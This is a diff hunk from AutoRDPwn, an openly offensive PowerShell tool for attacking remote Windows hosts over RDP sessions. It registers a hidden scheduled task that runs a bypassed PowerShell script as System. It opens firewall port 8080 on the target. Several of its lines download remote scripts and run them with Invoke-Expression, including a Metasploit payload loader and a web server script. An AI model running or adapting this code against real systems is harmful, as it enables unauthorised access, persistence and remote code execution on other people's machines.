@@ -547,12 +547,13 @@ echo $script > $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
 $action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}
 
-if ($webserver){ invoke-command -session $RDP[0] -scriptblock { netsh advfirewall firewall delete rule name="Powershell Webserver" 2>&1> $null
-netsh advfirewall firewall add rule name="Powershell Webserver" dir=in action=allow protocol=TCP localport=8080 2>&1> $null ; Write-Host
+if ($webserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1')
+invoke-command -session $RDP[0] -scriptblock { netsh advfirewall firewall delete rule name="Powershell Web Server" 2>&1> $null
+netsh advfirewall firewall add rule name="Powershell Web Server" dir=in action=allow protocol=TCP localport=8080 2>&1> $null ; Write-Host
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Write-Host http://$using:computer`:8080 -ForegroundColor Blue
-Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
-Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1') }}
+Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host }
+invoke-command -session $RDP[0] -scriptblock ${function:Start-WebServer}}
 
 if ($metasploit){ invoke-command -session $RDP[0] -scriptblock { Write-Host
 Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-MetasploitPayload.ps1')
